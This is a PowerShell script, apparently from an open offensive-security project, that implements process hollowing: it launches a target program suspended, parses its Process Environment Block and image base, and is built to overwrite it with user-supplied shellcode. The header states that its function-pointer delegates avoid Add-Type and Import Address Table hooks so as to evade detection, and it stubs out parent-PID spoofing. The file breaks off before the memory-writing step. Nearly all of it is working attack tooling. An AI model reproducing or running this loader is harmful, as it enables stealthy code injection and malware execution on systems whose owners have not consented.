function Process-Hollow {
#.SYNOPSIS
# Standalone PowerShell Script for Process Hollowing utilizing Function Pointer Delegates
# Arbitrary Version Number: 0.9.9
# Author: Tyler McCann (@tylerdotrar)
#
#.DESCRIPTION
# This tool does not utilize Add-Type or any embedded C# -- rather it utilizes custom delegates to
# wrap Win32 function pointers.  This prevents detection via Import Address Table (IAT) hooks.
#
# Userland API Call(s) Required:
#  |__ WriteProcessMemory()
#  |__ ReadProcessMemory()
#  |__ CreateProcess()
#  |__ NtQueryInformationProcess()
#  |__ ResumeThread()
#  |
#  |__ OpenProcess()                      -->  PPID Spoof (WIP)
#  |__ InitializeProcThreadAttributeList  -->  PPID Spoof (WIP)
#  |__ UpdateProcThreadAttribute()        -->  PPID Spoof (WIP)
#
# Struct(s) Utilized:
#  |__ STARTUPINFO
#  |__ PROCESS_INFORMATION
#  |__ PROCESS_BASIC_INFORMATION
#  |__ SECURITY_ATTRIBUTES
#  |
#  |__ STARTUPINFOEX                      -->  PPID Spoof (WIP)
#
# Works with both Windows PowerShell and PowerShell Core (Pwsh). Using 64-bit PowerShell sessions
# allows for both 64-bit and 32-bit injection, whereas 32-bit sessions only allow 32-bit injection.
#
# Parameters:
#   -Shellcode      -->  Shellcode to execute (can be a byte array or string containing file path or bytes).
#   -CreateProcess  -->  Target process PID to inject into.
#   -ProcessArgs    -->  Pass arguments to process rather than hollowing with shellcode.
#   -Debug          -->  Toggle debug messages and print shellcode address for process attachment.
#   -Help           -->  Return Get-Help information.
#
# Example Usage:
#
#.LINK
# https://github.com/tylerdotrar/ShellcodeLoaderPS


    Param(
        $Shellcode, # Intentionally vague type for maximum compatibility
        [string]$CreateProcess,
        [string]$ProcessArgs,
        [switch]$Debug,
        [switch]$Help
        #[int]$PPID,
        #[string]$ParentProcess,
    )


    # Return Get-Help information
    if ($Help) { return (Get-Help Process-Hollow) }


    # Error Correction
    if (!$Shellcode)     { return (Write-Host '[!] Error! Missing shellcode.' -ForegroundColor Red) }
    if (!$CreateProcess) { return (Write-Host '[!] Error! Missing target process to execute.' -ForegroundColor Red) }
    if (!(Get-Item -LiteralPath $CreateProcess 2>$NULL).FullName -and !(Get-Command -Name $CreateProcess 2>$NULL).Path) {
        return (Write-Host "[!] Error! Unable to locate process '${ProcessName}'." -ForegroundColor Red)
    }


    # Internal Function(s)
    function Format-ByteArray ($Shellcode) {

        # Function Description   : PowerShell Script (mini version) to Convert Multi-Language Shellcode Strings into Byte Arrays
        # Full Version Reference : https://github.com/tylerdotrar/ShellcodeLoaderPS/blob/main/helpers/Format-ByteArray.ps1

        # Print data type
        Write-Host "[!] Detecting Data Type of Shellcode Parameter:" -ForegroundColor Yellow
        Write-Host " o  BaseType : $($Shellcode.GetType().BaseType)"
        Write-Host " o  Name     : $($Shellcode.GetType().Name)"
        
        # Checking format before parsing
        if ($Shellcode -is [array]) {
            
            # Shellcode is already formatted as a byte array
            if ($Shellcode -is [Byte[]]) {
                Write-Host '[!] Shellcode parameter is already formatted as a [byte[]].' -ForegroundColor Yellow
                Write-Host ' o  --> No formatting required.'
                $shellcodeBuffer = $Shellcode
            }
            # Convert array to a string for attempted parsing
            else {
                Write-Host '[!] Formatting Shellcode for PowerShell:' -ForegroundColor Yellow
                Write-Host ' o  Shellcode parameter is an [array].'
                Write-Host ' o  --> Converting to [string]...'
                $Shellcode = $Shellcode -join ''
            }
        }
    
        # Attempt to determine what language the shellcode is formatted for
        if ($Shellcode -is [String]) {
            
            $Shellcode = $Shellcode.Replace("`r","").Replace("`n",'')

            # Check if $Shellcode is a path to a shellcode file
            #   > Path to Raw Shellcode  :  .\shellcode.bin

            if (Test-Path -LiteralPath $Shellcode 2>$NULL) {
                
                Write-Host '[!] Formatting Shellcode for PowerShell:' -ForegroundColor Yellow
                Write-Host ' o  Shellcode [string] is a path to a file.'

                $ShellcodePath   = (Get-Item -LiteralPath $Shellcode).Fullname
                $shellcodeBuffer = [System.IO.File]::ReadAllBytes($ShellcodePath)

                Write-Host " o  --> Path : $ShellcodePath"
                Write-host ' o  --> Reading file bytes...'
            }

            # Format C or Python formatted shellcode string into PowerShell format
            #   > Python Shellcode Format  :  'b"\x45\x78\x61\x6d\x70\x6c\x65"'
            #   > C Shellcode Format       :  '\x45\x78\x61\x6d\x70\x6c\x65'

            elseif (($Shellcode -like 'b"\x*') -or ($Shellcode -like '\x*')) {
                
                Write-Host '[!] Formatting Shellcode for PowerShell:' -ForegroundColor Yellow
                Write-Host ' o  Shellcode [string] is formatted for C or Python.'
                Write-Host ' o  --> Formatting for PowerShell...'

                # Convert to PowerShell ASCII array
                $Shellcode = $Shellcode.Replace(' ','')
                $psShellcode = ($Shellcode.Replace('b"','').Replace('"','')).Split('\')[1..$Shellcode.Length]

                # Convert Shellcode ASCII array to Byte Array
                $shellcodeBuffer = [byte[]]($psShellcode | % { [convert]::ToByte($_.Replace('x',''),16) })
            }

            # Format C++ or C# formatted shellcode string into PowerShell format
            #   > C++ / C# Shellcode Format  :  '{0x45,0x78,0x61,0x70,0x6c,0x65}'

            elseif (($Shellcode -like '{0x*') -or ($Shellcode -like '{ 0x*')) {
                
                Write-Host '[!] Formatting Shellcode for PowerShell:' -ForegroundColor Yellow
                Write-Host ' o  Shellcode [string] is formatted for C++ or C#.'
                Write-Host ' o  --> Formatting for PowerShell...'

                # Convert to PowerShell ASCII array
                $Shellcode = $Shellcode.Replace(' ','')
                $psShellcode = ($Shellcode.Replace('{0x','').Replace('}','')) -Split ',0x'

                # Convert Shellcode ASCII array to Byte Array
                $shellcodeBuffer = [byte[]]($psShellcode | % { [convert]::ToByte($_,16) })
            }

            else { return (Write-Host '[!] Error! Unable to determine shellcode langauge format.' -ForegroundColor Red) }
        }
        
        # Return shellcode byte array
        if (!$shellcodeBuffer) { return (Write-Host '[!] Error! Unable to determine shellcode type.' -ForegroundColor Red) }
        Write-Host " o  --> Shellcode Length : $($shellcodeBuffer.Length) bytes"
        return ,$shellcodeBuffer
    }
    function Load-Win32Function ([string]$Library, [string]$FunctionName, [type[]]$ParamTypes = @($null), [type]$ReturnType = [Void], [bool]$Debug) {

        # Function Description   : PowerShell Script (mini version) to Load Win32 API Calls into Session via Function Pointers and Delegates
        # Full Version Reference : https://github.com/tylerdotrar/ShellcodeLoaderPS/blob/main/helpers/Load-Win32Function.ps1

        ### Step 1: Acquire Memory Address of Target Win32 Function

        Try {
            if ($PSVersionTable.PSEdition -eq 'Core') {
            
                # Get a handle to the target library via Load() method
                $LibraryHandle   = [System.Runtime.InteropServices.NativeLibrary]::Load($Library)
                if (($LibraryHandle -eq 0) -or ($LibraryHandle -eq $NULL)) { return (Write-Host "[!] Error! Null handle to target library '${Library}'." -ForegroundColor Red) }

                # Acquire the memory address of the target function via GetExport() method
                $FunctionAddress = [System.Runtime.InteropServices.NativeLibrary]::GetExport($LibraryHandle, $FunctionName)
                if (($FunctionAddress -eq 0) -or ($FunctionAddress -eq $NULL)) { return (Write-Host "[!] Error! Unable to find address to target function '${FunctionName}'." -ForegroundColor Red) }
            }
            else {
        
                # Get a reference to System.dll in the Global Assembly Cache (GAC)
                $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -and ($_.Location -like '*\System.dll') }
                $UnsafeMethods  = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')

                # Get a reference to the GetModuleHandle() and GetProcAddress() functions
                $GetModuleHandle = ($UnsafeMethods.GetMethods() | ? {$_.Name -eq 'GetModuleHandle'})[0]
                $GetProcAddress  = ($UnsafeMethods.GetMethods() | ? {$_.Name -eq 'GetProcAddress'})[0]

                # Get a handle to the target library (module) via GetModuleHandle()
                $LibraryHandle   = $GetModuleHandle.Invoke($Null, @($Library))
                if (($LibraryHandle -eq 0) -or ($LibraryHandle -eq $NULL)) { return (Write-Host "[!] Error! Null handle to target library '${Library}'." -ForegroundColor Red) }

                # Acquire the memory address of the target function (proc) via GetProcAddress() 
                $FunctionAddress = $GetProcAddress.Invoke($Null, @($LibraryHandle, $FunctionName))
                if (($FunctionAddress -eq 0) -or ($FunctionAddress -eq $NULL)) { return (Write-Host "[!] Error! Unable to find address to target function '${FunctionName}'." -ForegroundColor Red) }
            }
        }
        Catch {
            Write-Host "[!] Error acquiring function memory address! Return details:" -ForegroundColor Red
            $Error[0]
            $_.Exception | Select-Object -Property ErrorRecord,Source,HResult | Format-List
            $_.InvocationInfo | Select-Object -Property PSCommandPath,ScriptLineNumber,Statement | Format-List
            return
        } 

        ### Step 2: Build Win32 Function Delegate for Parameter Types and Return Types

        # Check if the function delegate already exists in the current session
        foreach ($Assembly in [AppDomain]::CurrentDomain.GetAssemblies()) {
            $CustomType = $Assembly.GetType($FunctionName, $False)
            if ($CustomType -ne $NULL) {
                if ($Debug) { Write-Host '[x] Debug: ' -NoNewLine -ForegroundColor Magenta ; Write-Host "Existing delegate found for " -NoNewline ; Write-Host "'${FunctionName}()'" -ForegroundColor Green }
                $FunctionDelegate = $CustomType
                break
            }
        }

        if (!$FunctionDelegate) {
            
            if ($Debug) { Write-Host '[x] Debug: ' -NoNewLine -ForegroundColor Magenta ; Write-Host "Building new delegate for " -NoNewline ; Write-Host "'${FunctionName}()'" -ForegroundColor Green }

            Try {
                # Generate a unique in-memory .NET assembly name to host delegate type
                $DynAssembly = [System.Reflection.AssemblyName]::new([guid]::NewGuid().ToString())

                # Define non-persistent assembly in memory with execute-only permissions
                $AssemblyBuilder = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
                $ModuleBuilder   = $AssemblyBuilder.DefineDynamicModule([guid]::NewGuid().ToString())

                # Define new delegate type to match unmanaged Win32 function signature
                $TypeBuilder = $ModuleBuilder.DefineType($FunctionName, 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

                # Define special constructor for the delegate type (required by CLR to instantiate the delegate from a function pointer)
                $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([Object], [IntPtr])) 
                $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')

                # Define 'Invoke' method with the correct function parameter type(s) and return type(s)
                $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $ParamTypes)
                $MethodBuilder.SetImplementationFlags('Runtime, Managed')

                # Return the usable, dynamic delegate type for function pointer invocation
                $FunctionDelegate = $TypeBuilder.CreateType()
            }
            Catch {
                Write-Host "[!] Error building function delegate! Return details:" -ForegroundColor Red
                $Error[0]
                $_.Exception | Select-Object -Property ErrorRecord,Source,HResult | Format-List
                $_.InvocationInfo | Select-Object -Property PSCommandPath,ScriptLineNumber,Statement | Format-List
                return
            }
        }

        # Return usable function to session
        return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FunctionAddress, $FunctionDelegate)
    }
    function Build-Win32Struct ([string]$StructName, [array]$MembersObject) {

        # Function Description   : PowerShell Script (mini version) to Create Win32 Data Structures in Memory
        # Full Version Reference : https://github.com/tylerdotrar/ShellcodeLoaderPS/blob/main/helpers/Build-Win32Struct.ps1

        # Check if the struct type already exists in the current session
        foreach ($Assembly in [AppDomain]::CurrentDomain.GetAssemblies()) {
            $CustomType = $Assembly.GetType($StructName, $False)
            if ($CustomType -ne $NULL) {
                # Write-Host '[!] Found existing struct type...' -ForegroundColor Yellow # Used for debugging
                return $CustomType
            }
        }

        # Generate a unique in-memory .NET assembly name to host delegate type
        $DynAssembly = [System.Reflection.AssemblyName]::new([guid]::NewGuid().ToString())

        # Define non-persistent assembly in memory with execute-only permissions
        $AssemblyBuilder = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder   = $AssemblyBuilder.DefineDynamicModule([guid]::NewGuid().ToString())

        # Create a public value type (struct) with sequential memory layout for unmanaged interop
        $Attributes  = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType($StructName, $Attributes, [System.ValueType])

        # Define public fields for each struct member
        foreach ($Member in $MembersObject) {
            [void]$TypeBuilder.DefineField($Member.Name, $Member.Type, 'Public')
        }

        # Return the value type (struct) definition as a usable .NET type
        return $TypeBuilder.CreateType()
    }
    function Print-Hex ($Integer) {
        $hexValue = '{0:X}' -f $Integer
        return "0x${hexValue}"
    }
    function Generic-Error() {
        Write-Host "[!] Unexpected error occured! Return details:" -ForegroundColor Red
        $Error[0]
        $_.Exception | Select-Object -Property ErrorRecord,Source,HResult | Format-List
        $_.InvocationInfo | Select-Object -Property PSCommandPath,ScriptLineNumber,Statement | Format-List
        return
    }


    # Parameter Processing
    if (Test-Path -LiteralPath $CreateProcess 2>$NULL) { $CreateProcess = (Get-Item -LiteralPath $CreateProcess).FullName }
    else                                               { $CreateProcess = (Get-Command -Name $CreateProcess).Path         }

    [byte[]]$ShellcodeBuffer = Format-ByteArray $Shellcode
    if ($ShellcodeBuffer -isnot [byte[]]) { return }
    

    ### Define Required Struct(s)

    # STARTUPINFOA
    # Ref: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
    $StructMembers = @(
        [PSCustomObject]@{ Name = 'cb'              ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'lpReserved'      ; Type = [String] },
        [PSCustomObject]@{ Name = 'lpDesktop'       ; Type = [String] },
        [PSCustomObject]@{ Name = 'lpTitle'         ; Type = [String] },
        [PSCustomObject]@{ Name = 'dwX'             ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwY'             ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwXSize'         ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwYSize'         ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwXCountChars'   ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwYCountChars'   ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwFillAttribute' ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwFlags'         ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'wShowWindow'     ; Type = [Int16]  },
        [PSCustomObject]@{ Name = 'cbReserved2'     ; Type = [Int16]  },
        [PSCustomObject]@{ Name = 'lpReserved2'     ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'hStdInput'       ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'hStdOutput'      ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'hStdError'       ; Type = [IntPtr] }
    )
    $StartupInfoType    = Build-Win32Struct -StructName "STARTUPINFOA" -MembersObject $StructMembers
    $StartupInfoTypeRef = $StartupInfoType.MakeByRefType() # Used for creating function delegate(s)
    $StartupInfo        = [STARTUPINFOA]::new()            # Used for Win32 function parameter(s)

    # STARTUPINFOEXA
    # Ref: https://learn.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-startupinfoexa
    $StructMembers = @(
        [PSCustomObject]@{ Name = 'StartupInfo'     ; Type = $StartupInfoType },
        [PSCustomObject]@{ Name = 'lpAttributeList' ; Type = [IntPtr] }
    )
    $StartupInfoExType    = Build-Win32Struct -StructName "STARTUPINFOEXA" -MembersObject $StructMembers
    $StartupInfoExTypeRef = $StartupInfoExType.MakeByRefType() # Used for creating function delegate(s)
    $StartupInfoEx        = [STARTUPINFOEXA]::new()            # Used for Win32 function parameter(s)
    
    # PROCESS_INFORMATION
    # Ref: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
    $StructMembers = @(
        [PSCustomObject]@{ Name = 'hProcess'    ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'hThread'     ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'dwProcessId' ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwThreadId'  ; Type = [Int32]  }
    )
    $ProcessInformationType    = Build-Win32Struct -StructName "PROCESS_INFORMATION" -MembersObject $StructMembers
    $ProcessInformationTypeRef = $ProcessInformationType.MakeByRefType() # Used for creating function delegate(s)
    $ProcessInformation        = [PROCESS_INFORMATION]::new()            # Used for Win32 function parameter(s)

    # PROCESS_BASIC_INFORMATION
    # Ref: https://ntdoc.m417z.com/process_basic_information
    # Ref: https://www.pinvoke.net/default.aspx/Structures/PROCESS_BASIC_INFORMATION.html
    $StructMembers = @(
        [PSCustomObject]@{ Name = 'ExitStatus'                   ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'PebAddress'                   ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'AffinityMask'                 ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'BasePriority'                 ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'UniquePID'                    ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'InheritedFromUniqueProcessId' ; Type = [IntPtr] }
    )
    $ProcessBasicInformationType    = Build-Win32Struct -StructName "PROCESS_BASIC_INFORMATION" -MembersObject $StructMembers
    $ProcessBasicInformationTypeRef = $ProcessBasicInformationType.MakeByRefType() # Used for creating function delegate(s)
    $ProcessBasicInformation        = [PROCESS_BASIC_INFORMATION]::new()           # Used for Win32 function parameter(s)

    # SECURITY_ATTRIBUTES
    # Ref: https://learn.microsoft.com/en-us/windows/win32/api/wtypesbase/ns-wtypesbase-security_attributes
    $StructMembers = @(
        [PSCustomObject]@{ Name = 'nLength'              ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'lpSecurityDescriptor' ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'bInheritHandle'       ; Type = [Bool]   }
    )
    $SecurityAttributesType    = Build-Win32Struct -StructName "SECURITY_ATTRIBUTES" -MembersObject $StructMembers
    $SecurityAttributesTypeRef = $SecurityAttributesType.MakeByRefType() # Used for creating function delegate(s)
    $ProcessAttributes         = [SECURITY_ATTRIBUTES]::new()            # Used for Win32 function parameter(s) 1
    $ThreadAttributes          = [SECURITY_ATTRIBUTES]::new()            # Used for Win32 function parameter(s) 2


    ### Load Userland API Calls required for Process Hollowing

    #  |__ WriteProcessMemory()
    #  |__ ReadProcessMemory()
    #  |__ CreateProcess()
    #  |__ ZwQueryInformationProcess() | NtQueryInformationProcess()
    #  |__ ResumeThread()

    ### Load Userland API Calls required for PPID Spoofing

    #  |__ OpenProcess()
    #  |__ InitializeProcThreadAttributeList()
    #  |__ UpdateProcThreadAttribute()

    Write-Host '[!] Loading Win32 API Calls...' -ForegroundColor Yellow

    Try {
        # Process Hollowing
        $CreateProcArgs = @(
            [String],                   #lpApplicationName
            [String],                   #lpCommandLine
            $SecurityAttributesTypeRef, #lpProcessAttributes
            $SecurityAttributesTypeRef, #lpThreadAttributes
            [Bool],                     #bInheritHandles
            [Int32],                    #dwCreationFlags
            [IntPtr],                   #lpEnvironment
            [String],                   #lpCurrentDirectory
            $StartupInfoTypeRef,        #lpStartupInfo
            $ProcessInformationTypeRef  #lpProcessInformation
        )
        $CreateProcessA = Load-Win32Function -Library "Kernel32.dll" -FunctionName "CreateProcessA" -ParamTypes $CreateProcArgs -ReturnType ([Bool]) -Debug $Debug
        Write-Host ' o  Function ' -NoNewline ; Write-Host "'Kernel32!CreateProcessA()'" -NoNewline -ForegroundColor Green ; Write-Host ' loaded into session.'

        $NtQueryInfoArgs = @(
            [IntPtr],                        # ProcessHandle
            [Int32],                         # ProcessInformationClass
            $ProcessBasicInformationTypeRef, # ProcessInformation
            [UInt32],                        # ProcessInformationLength
            [UInt32].MakeByRefType()         # ReturnLength
        )
        $NtQueryInformationProcess = Load-Win32Function -Library "Ntdll.dll" -FunctionName "NtQueryInformationProcess" -ParamTypes $NtQueryInfoArgs -ReturnType ([Int32]) -Debug $Debug
        Write-Host ' o  Function ' -NoNewline ; Write-Host "'Ntdll!NtQueryInformationProcess()'" -NoNewline -ForegroundColor Green ; Write-Host ' loaded into session.'

        $ReadProcMemArgs = @(
            [IntPtr],               # hProcess
            [IntPtr],               # lpBaseAddress
            [Byte[]],               # lpBuffer
            [Int32],                # nSize
            [Int32].MakeByRefType() #lpNumberOfBytesRead
        )
        $ReadProcessMemory = Load-Win32Function -Library "Kernel32.dll" -FunctionName "ReadProcessMemory" -ParamTypes $ReadProcMemArgs -ReturnType ([Bool]) -Debug $Debug
        Write-Host ' o  Function ' -NoNewline ; Write-Host "'Kernel32!ReadProcessMemory()'" -NoNewline -ForegroundColor Green ; Write-Host ' loaded into session.'

        $WriteProcMemArgs = @(
            [IntPtr],               # hProcess
            [IntPtr],               # lpBaseAddress
            [Byte[]],               # lpBuffer
            [Int32],                # nSize
            [Int32].MakeByRefType() #lpNumberOfBytesRead
        )
        $WriteProcessMemory = Load-Win32Function -Library "Kernel32.dll" -FunctionName "WriteProcessMemory" -ParamTypes $WriteProcMemArgs -ReturnType ([Bool]) -Debug $Debug
        Write-Host ' o  Function ' -NoNewline ; Write-Host "'Kernel32!WriteProcessMemory()'" -NoNewline -ForegroundColor Green ; Write-Host ' loaded into session.'

        $ResThreadArgs = @(
            [IntPtr] # hThread
        )
        $ResumeThread = Load-Win32Function -Library "Kernel32.dll" -FunctionName "ResumeThread" -ParamTypes $ResThreadArgs -ReturnType ([UInt32]) -Debug $Debug
        Write-Host ' o  Function ' -NoNewline ; Write-Host "'Kernel32!ResumeThread()'" -NoNewline -ForegroundColor Green ; Write-Host ' loaded into session.'
        
        # PPID Spoofing
        $OpenProcArgs = @(
            [UInt32], # dwDesiredAccess
            [Bool],   # bInheritHandle
            [UInt32]  # dwProcessId
        )
        $OpenProcess = Load-Win32Function -Library "Kernel32.dll" -FunctionName "OpenProcess" -ParamTypes $OpenProcArgs -ReturnType ([IntPtr]) -Debug $Debug
        Write-Host ' o  Function ' -NoNewline ; Write-Host "'Kernel32!OpenProcess()'" -NoNewline -ForegroundColor Green ; Write-Host ' loaded into session.'

    }
    Catch { return Generic-Error }


    ### Initialize Key Variables / Enums for later API Calls

    # Reference: https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
    $AccessRights = @{
        PROCESS_ALL_ACCESS        = 0x000F0000 -bor 0x00100000 -bor 0xFFFF;
        PROCESS_CREATE_THREAD     = 0x0002;
        PROCESS_QUERY_INFORMATION = 0x0400;
        PROCESS_VM_OPERATION      = 0x0008;
        PROCESS_VM_READ           = 0x0010;
        PROCESS_VM_WRITE          = 0x0020;
    }
    # Reference: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
    $MemoryAllocation = @{
        MEM_COMMIT  = 0x00001000;
        MEM_RESERVE = 0x00002000;
    }
    # Reference: https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
    $MemoryProtection = @{
        PAGE_EXECUTE           = 0x10;
        PAGE_READWRITE         = 0x04;
        PAGE_EXECUTE_READWRITE = 0x40;
    }
    # Reference: https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags
    $CreationFlags = @{
        CREATE_SUSPENDED             = 0x00000004;
        CREATE_NO_WINDOWS            = 0x08000000;
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
    }
    # Reference: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
    $StartupFlags = @{
        STARTF_USESTDHANDLES = 0x00000100;
        STARTF_USESHOWWINDOW = 0x00000001;
    }
    # Reference: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute
    $ProcThreadFlags = @{
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS    = 0x00020000;
        PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;
    }


    ### (1) Create Target Process in a Suspended State

    Write-Host "[!] Creating target process..." -ForegroundColor Yellow

    # CreateProcessA()
    #  > Description : Create a new process and its primary thread.
    #  > Location    : Kernel32.dll
    #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa

    # Argument(s)
    $lpApplicationName    = $CreateProcess                            # Name of the application to be executed (full path).
    $lpCommandLine        = "${CreateProcess} ${ProcessArgs}"         # Command line arguments to be executed  (full path + optional arguments).
    $lpProcessAttributes  = [ref]$ProcessAttributes                   # Pointer to a SECURITY_ATTRIBUTES struct that determines if the returned process handle can be inherited.
    $lpThreadAttributes   = [ref]$ThreadAttributes                    # Pointer to a SECURITY_ATTRIBUTES struct that determines if the returned thread handle can be inherited.
    $bInheritHandles      = $False                                    # Boolean for if 
    $dwCreationFlags      = $CreationFlags.CREATE_SUSPENDED           # 
    $lpEnvironment        = [IntPtr]::Zero                            #
    $lpCurrentDirectory   = $(Split-Path -LiteralPath $CreateProcess) # 
    $lpStartupInfo        = [ref]$StartupInfo                         # 
    $lpProcessInformation = [ref]$ProcessInformation                  # 

    Try {
        $Success = $CreateProcessA.Invoke($lpApplicationName, $lpCommandLine, $lpProcessAttributes, $lpThreadAttributes, $bInheritHandles, $dwCreationFlags, $lpEnvironment, $lpCurrentDirectory, $lpStartupInfo, $lpProcessInformation)

        Write-Host ' o  ' -NoNewline ; Write-Host 'CreateProcessA()' -ForegroundColor Green
        if ($Success) {

            $RetProcessInformation = $lpProcessInformation.Value

            Write-Host " o  --> Process Path : ${CreateProcess}"
            Write-Host " o  --> Process PID  : $($RetProcessInformation.dwProcessId)"
        }
        else { Write-Host " o  --> Failure! Last Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red }
    }
    Catch { return Generic-Error }

    
    ### (2) Parse the Process Enviroment Block (PEB) of the Suspended Process

    Write-Host "[!] Parsing the Created Process' Process Environment Block (PEB)..." -ForegroundColor Yellow 

    # NtQueryInformationProcess()
    #  > Description : Retrieves information about a specified process.
    #  > Location    : Ntdll.dll
    #  > Reference 1 : https://ntdoc.m417z.com/ntqueryinformationprocess
    #  > Reference 2 : https://www.pinvoke.net/default.aspx/ntdll.ntqueryinformationprocess

    # Argument(s)
    $ProcessHandle            = $RetProcessInformation.hProcess # Handle to the target process                                          (i.e., acquired from CreateProcessA() returned process information).
    $ProcessInformationClass  = 0                               # Type of process information to be retrieved                           (i.e., 0 retrieves a pointer to the process' PEB structure).
    $ProcessInformation       = [ref]$ProcessBasicInformation   # Output buffer to receive the requested process information            (i.e., variable to receive the pointer to the process' PEB structure).
    $ProcessInformationLength = [IntPtr]::Size * 6              # Size of the 'ProcessInformation' buffer                               (i.e., 48 bytes).
    $ReturnLength             = 0                               # Output buffer to receive the size of the requested information buffer (i.e., hopefully 48 bytes).

    Try {
        $NTSTATUS_INT = $NtQueryInformationProcess.Invoke($ProcessHandle, $ProcessInformationClass, $ProcessInformation, $ProcessInformationLength, [ref]$ReturnLength)

        Write-Host ' o  ' -NoNewline ; Write-Host 'NtQueryInformationProcess()' -ForegroundColor Green

        $ImageBaseAddrPtr = [Int64]$ProcessBasicInformation.PebAddress + 0x10 # Pointer to beginning of PE file (i.e. IMAGE_DOS_HEADER)

        Write-Host " o  --> Process Environment Block (PEB) Address : $(Print-Hex $ProcessBasicInformation.PebAddress)"
        Write-Host " o  --> Image Base Address Pointer (PEB + 0x10) : $(Print-Hex $ImageBaseAddrPtr)"

    }
    Catch { return Generic-Error }


    ### (3) Acquire Offsets from the Image Base Address

    Write-Host "[!] Acquiring the Image Base Address..." -ForegroundColor Yellow

    # ReadProcessMemory() (1 of 2)
    #  > Description : Read memory from a specified process.
    #  > Location    : Kernel32.dll
    #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory

    # Argument(s)
    $hProcess            = $RetProcessInformation.hProcess                              # Handle to the target process
    $lpBaseAddress       = $ImageBaseAddrPtr                              # Starting address to begin reading.
    $lpBuffer            = [Array]::CreateInstance([byte],[IntPtr]::Size) # Buffer to receive contents (e.g., 8-byte memory address)
    $nSize               = $lpBuffer.Length                               # Size of the buffer
    $lpNumberOfBytesRead = [ref]0                                         # Number of bytes successfully read

    Try {
        $Success = $ReadProcessMemory.Invoke($hProcess, $lpBaseAddress, $lpBuffer, $nSize, $lpNumberOfBytesRead)

        if ($Success) {
            Write-Host ' o  ' -NoNewline ; Write-Host 'ReadProcessMemory()' -ForegroundColor Green

            [IntPtr]$ImageBaseAddress = [BitConverter]::ToInt64($lpBuffer,0) # Image Base Address (8-bytes) located at beginning of PE

            Write-Host " o  --> Image Base Address (IBA) : $(Print-Hex $ImageBaseAddress)"
        }
        else { Write-Host " o  --> Failure! Last Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red }
    }
    Catch { return Generic-Error }


    ### (4) Determine Relative Virtual Address Offsets

    Write-Host "[!] Determining Offsets to acquire PE EntryPoint..." -ForegroundColor Yellow

    # ReadProcessMemory() (2 of 2)
    #  > Description : Read memory from a specified process.
    #  > Location    : Kernel32.dll
    #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory

    # Argument(s)
    $hProcess            = $RetProcessInformation.hProcess       # Handle to the target process
    $lpBaseAddress       = $ImageBaseAddress                     # Starting address to begin reading.
    $lpBuffer            = [Array]::CreateInstance([byte],0x200) # Buffer to receive contents.
    $nSize               = $lpBuffer.Length                      # Size of the buffer
    $lpNumberOfBytesRead = [ref]0                                # Number of bytes successfully read

    Try {
        $Success = $ReadProcessMemory.Invoke($hProcess, $lpBaseAddress, $lpBuffer, $nSize, $lpNumberOfBytesRead)

        if ($Success) {
            Write-Host ' o  ' -NoNewline ; Write-Host 'ReadProcessMemory()' -ForegroundColor Green

